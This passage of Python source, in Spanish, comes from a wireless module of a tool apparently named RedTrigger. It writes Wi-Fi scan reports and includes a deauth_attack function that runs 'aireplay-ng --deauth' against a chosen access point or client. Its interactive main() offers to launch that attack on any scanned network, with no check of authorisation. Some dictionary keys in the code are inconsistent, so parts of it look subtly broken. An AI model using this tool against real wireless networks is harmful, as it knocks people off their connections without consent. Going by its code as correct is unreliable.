                    f.write("=== INFORME DE ESCANEO DE REDES INALÁMBRICAS ===\n\n")
                    f.write(f"Interfaz: {results['interface']}\n")
                    f.write(f"Sistema Operativo: {results['os_type']}\n")
                    f.write(f"Inicio: {results['start_time']}\n")
                    f.write(f"Fin: {results['end_time']}\n")
                    f.write(f"Duración: {results['duration']:.2f} segundos\n\n")
                    
                    f.write("--- REDES ENCONTRADAS ---\n")
                    if results['networks']:
                        for i, network in enumerate(results['networks'], 1):
                            f.write(f"[{i}] BSSID: {network.get('bssid', 'N/A')}\n")
                            f.write(f"    ESSID: {network.get('essid', 'N/A')}\n")
                            f.write(f"    Canal: {network.get('channel', 'N/A')}\n")
                            f.write(f"    Señal: {network.get('signal', 'N/A')}\n")
                            f.write(f"    Encriptación: {network.get('encryption', 'N/A')}\n")
                            f.write(f"    Cifrado: {network.get('cipher', 'N/A')}\n")
                            f.write(f"    Autenticación: {network.get('authentication', 'N/A')}\n\n")
                    else:
                        f.write("No se encontraron redes\n\n")
                    
                    # Añadir información de seguridad si está disponible
                    if results.get('security_analysis') and results.get('security_results'):
                        f.write("--- ANÁLISIS DE SEGURIDAD ---\n")
                        for bssid, security in results['security_results'].items():
                            # Buscar el ESSID correspondiente al BSSID
                            essid = 'Desconocido'
                            for network in results['networks']:
                                if network.get('bssid') == bssid:
                                    essid = network.get('essid', 'Sin nombre')
                                    break
                            
                            f.write(f"Red: {essid} ({bssid})\n")
                            f.write(f"  Nivel de seguridad: {security['level']}\n")
                            if security.get('vulnerabilities'):
                                f.write("  Vulnerabilidades:\n")
                                for vuln in security['vulnerabilities']:
                                    f.write(f"    - {vuln}\n")
                            f.write("\n")
                    
                    f.write("--- CLIENTES ENCONTRADOS ---\n")
                    if results['clients']:
                        for i, client in enumerate(results['clients'], 1):
                            f.write(f"[{i}] MAC: {client.get('mac', 'N/A')}\n")
                            f.write(f"    BSSID: {client.get('bssid', 'N/A')}\n")
                            f.write(f"    ESSID: {client.get('essid', 'N/A')}\n")
                            f.write(f"    Paquetes: {client.get('packets', 'N/A')}\n\n")
                    else:
                        f.write("No se encontraron clientes\n\n")
                    
                    # Añadir información de dispositivos detectados si está disponible
                    if results.get('detected_devices'):
                        f.write("--- DISPOSITIVOS CONECTADOS ---\n")
                        for mac, device in results['detected_devices'].items():
                            f.write(f"MAC: {mac}\n")
                            f.write(f"  IP: {device.get('ip', 'N/A')}\n")
                            f.write(f"  Fabricante: {device.get('vendor', 'Desconocido')}\n")
                            f.write(f"  Paquetes: {device.get('packets', 0)}\n\n")
                    
                    f.write("\n=== FIN DEL INFORME ===\n")
            elif format.lower() == 'html':
                # Usar el nuevo método para generar HTML
                html_content = self._generate_html_report(results)
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(html_content)
            else:
                logger.error(f"Formato de informe no soportado: {format}")
                return False
            
            logger.info(f"Informe generado en {output_file}")
            return True
        except Exception as e:
            logger.error(f"Error al generar informe: {str(e)}")
            return False

# Función para escanear redes inalámbricas
def scan_wireless_networks(interface, scan_time=30, output_dir=None):
    '''
    Escanea redes inalámbricas
    '''
    # Validar parámetros
    if not interface:
        logger.error("No se ha especificado una interfaz")
        return None
    
    # Configurar escáner
    scanner = WirelessScanner({
        'interface': interface,
        'scan_time': scan_time,
        'output_dir': output_dir or 'results',
        'verbose': True
    })
    
    # Iniciar escaneo
    success = scanner.start_scan()
    if not success:
        logger.error("Error al realizar el escaneo")
        return None
    
    # Obtener resultados
    results = scanner.get_results()
    
    # Guardar resultados
    scanner.save_results()
    
    # Generar informe
    scanner.generate_report(format='html')
    
    return results

# Función para realizar un ataque de deautenticación
def deauth_attack(interface, bssid, client_mac=None, count=10):
    '''
    Realiza un ataque de deautenticación
    '''
    if not interface or not bssid:
        logger.error("Faltan parámetros obligatorios (interface, bssid)")
        return False
    
    # Verificar si la interfaz está en modo monitor
    if not is_interface_in_monitor_mode(interface):
        logger.error(f"La interfaz {interface} no está en modo monitor")
        return False
    
    # Verificar disponibilidad de aireplay-ng
    if not check_command_availability('aireplay-ng'):
        logger.error("aireplay-ng no está disponible")
        return False
    
    # Construir comando
    cmd = f"aireplay-ng --deauth {count}"
    
    if client_mac:
        cmd += f" -c {client_mac}"
    
    cmd += f" -a {bssid} {interface}"
    
    try:
        # Ejecutar comando
        logger.info(f"Enviando paquetes de deautenticación a {bssid}")
        output = run_command(cmd)
        
        if "Sending DeAuth" in output:
            logger.info("Ataque de deautenticación completado")
            return True
        else:
            logger.error("Error en ataque de deautenticación")
            return False
    except Exception as e:
        logger.error(f"Error en ataque de deautenticación: {str(e)}")
        return False

# Función principal para pruebas
def main():
    print(f"{COLORS['HEADER']}Módulo de escaneo de redes inalámbricas para RedTrigger{COLORS['ENDC']}")
    
    # Obtener interfaces inalámbricas
    interfaces = get_interface_info()
    wireless_interfaces = []
    
    for interface, info in interfaces.items():
        if info.get('wireless', False):
            wireless_interfaces.append(interface)
    
    if not wireless_interfaces:
        print(f"{COLORS['FAIL']}No se encontraron interfaces inalámbricas{COLORS['ENDC']}")
        return
    
    # Mostrar interfaces disponibles
    print(f"\n{COLORS['BOLD']}Interfaces inalámbricas disponibles:{COLORS['ENDC']}")
    for i, interface in enumerate(wireless_interfaces, 1):
        mode = "Monitor" if is_interface_in_monitor_mode(interface) else "Managed"
        print(f"{i}. {interface} ({mode})")
    
    # Solicitar interfaz
    interface_option = input(f"\n{COLORS['BOLD']}Seleccione una interfaz (1-{len(wireless_interfaces)}): {COLORS['ENDC']}")
    
    try:
        interface_index = int(interface_option) - 1
        if interface_index < 0 or interface_index >= len(wireless_interfaces):
            print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
            return
        
        interface = wireless_interfaces[interface_index]
    except:
        print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
        return
    
    # Verificar modo monitor
    if not is_interface_in_monitor_mode(interface):
        print(f"{COLORS['WARNING']}La interfaz {interface} no está en modo monitor{COLORS['ENDC']}")
        
        # Preguntar si se desea poner en modo monitor
        monitor_option = input(f"{COLORS['BOLD']}¿Desea poner la interfaz en modo monitor? (s/n): {COLORS['ENDC']}")
        
        if monitor_option.lower() == 's':
            print(f"{COLORS['BLUE']}Poniendo interfaz en modo monitor...{COLORS['ENDC']}")
            success = set_interface_monitor_mode(interface, True)
            
            if not success:
                print(f"{COLORS['FAIL']}No se pudo poner la interfaz en modo monitor{COLORS['ENDC']}")
                return
            
            print(f"{COLORS['GREEN']}Interfaz {interface} en modo monitor{COLORS['ENDC']}")
        else:
            print(f"{COLORS['WARNING']}El escaneo puede estar limitado sin modo monitor{COLORS['ENDC']}")
    
    # Solicitar tiempo de escaneo
    scan_time = input(f"{COLORS['BOLD']}Tiempo de escaneo en segundos (10-120, por defecto 30): {COLORS['ENDC']}") or "30"
    
    try:
        scan_time = int(scan_time)
        if scan_time < 10 or scan_time > 120:
            print(f"{COLORS['WARNING']}Tiempo no válido, usando valor por defecto (30){COLORS['ENDC']}")
            scan_time = 30
    except:
        print(f"{COLORS['WARNING']}Tiempo no válido, usando valor por defecto (30){COLORS['ENDC']}")
        scan_time = 30
    
    # Crear directorio de resultados
    output_dir = 'results'
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Iniciar escaneo
    print(f"\n{COLORS['GREEN']}Iniciando escaneo en interfaz {interface} durante {scan_time} segundos{COLORS['ENDC']}")
    print("Esto puede tardar varios minutos...")
    print("Presione Ctrl+C para cancelar el escaneo")
    
    try:
        results = scan_wireless_networks(interface, scan_time, output_dir)
        
        if results:
            # Mostrar resultados
            print(f"\n{COLORS['BLUE']}Escaneo completado{COLORS['ENDC']}")
            print(f"Redes encontradas: {len(results['networks'])}")
            print(f"Clientes encontrados: {len(results['clients'])}")
            
            if results['networks']:
                print(f"\n{COLORS['GREEN']}Redes encontradas:{COLORS['ENDC']}")
                for i, network in enumerate(results['networks'], 1):
                    print(f"  {i}. ESSID: {network.get('ESSID', 'N/A')}")
                    print(f"     BSSID: {network.get('BSSID', 'N/A')}")
                    print(f"     Canal: {network.get('channel', 'N/A')}")
                    print(f"     Cifrado: {network.get('Encryption key', 'N/A')}")
            
            # Mostrar ruta de los informes
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            json_file = os.path.join(output_dir, f"wireless_scan_{timestamp}.json")
            html_file = os.path.join(output_dir, f"wireless_report_{timestamp}.html")
            
            print(f"\n{COLORS['GREEN']}Informes generados:{COLORS['ENDC']}")
            print(f"  - JSON: {json_file}")
            print(f"  - HTML: {html_file}")
            
            # Preguntar si se desea realizar un ataque de deautenticación
            if results['networks']:
                deauth_option = input(f"\n{COLORS['BOLD']}¿Desea realizar un ataque de deautenticación? (s/n): {COLORS['ENDC']}")
                
                if deauth_option.lower() == 's':
                    # Solicitar red objetivo
                    network_option = input(f"{COLORS['BOLD']}Seleccione una red (1-{len(results['networks'])}): {COLORS['ENDC']}")
                    
                    try:
                        network_index = int(network_option) - 1
                        if network_index < 0 or network_index >= len(results['networks']):
                            print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
                            return
                        
                        network = results['networks'][network_index]
                        bssid = network.get('BSSID')
                        
                        if not bssid:
                            print(f"{COLORS['FAIL']}BSSID no disponible{COLORS['ENDC']}")
                            return
                        
                        # Solicitar número de paquetes
                        count = input(f"{COLORS['BOLD']}Número de paquetes (1-100, por defecto 10): {COLORS['ENDC']}") or "10"
                        
                        try:
                            count = int(count)
                            if count < 1 or count > 100:
                                print(f"{COLORS['WARNING']}Número no válido, usando valor por defecto (10){COLORS['ENDC']}")
                                count = 10
                        except:
                            print(f"{COLORS['WARNING']}Número no válido, usando valor por defecto (10){COLORS['ENDC']}")
                            count = 10
                        
                        # Realizar ataque
                        print(f"\n{COLORS['GREEN']}Iniciando ataque de deautenticación contra {bssid}{COLORS['ENDC']}")
                        success = deauth_attack(interface, bssid, count=count)
                        
                        if success:
                            print(f"{COLORS['GREEN']}Ataque completado{COLORS['ENDC']}")
                        else:
                            print(f"{COLORS['FAIL']}Error en ataque{COLORS['ENDC']}")
                    except:
                        print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
    except KeyboardInterrupt:
        print(f"\n{COLORS['WARNING']}Escaneo cancelado por el usuario{COLORS['ENDC']}")
    except Exception as e:
        print(f"\n{COLORS['FAIL']}Error durante el escaneo: {str(e)}{COLORS['ENDC']}")

if __name__ == '__main__':
    main()